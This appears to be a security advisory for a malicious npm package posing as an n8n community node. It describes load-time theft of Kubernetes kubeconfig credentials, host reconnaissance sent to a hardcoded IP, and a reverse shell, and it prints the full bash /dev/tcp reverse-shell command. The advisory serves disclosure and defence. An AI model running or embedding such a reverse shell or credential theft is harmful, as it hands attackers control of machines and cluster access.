summary: n8n-nodes-probe exfiltrates kubeconfig and opens reverse shell to hardcoded IP on require
details: index.js executes as a top-level IIFE when the module is required. It reads /home/ubuntu/.kube/config and /root/.kube/config, parses the bearer token, server URL, and CA from the kubeconfig, probes the cluster API with those credentials, and sends the collected reconnaissance (hostname, local IPs from `hostname -I`, kubeconfig-derived server, token preview, API responses) over a raw TCP socket to the hardcoded remote host 103.27.109.184 on port 8890. The same IIFE spawns `/bin/bash -c 'exec 3<>/dev/tcp/103.27.109.184/8895; bash -i <&3 >&3 2>&3'`, wiring an interactive shell to the same remote host on port 8895 and granting the remote party full command execution on the installer's machine. The package is presented as an n8n community node but performs no such functionality; its sole load-time behavior is Kubernetes credential theft, host reconnaissance, and reverse-shell backdoor.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
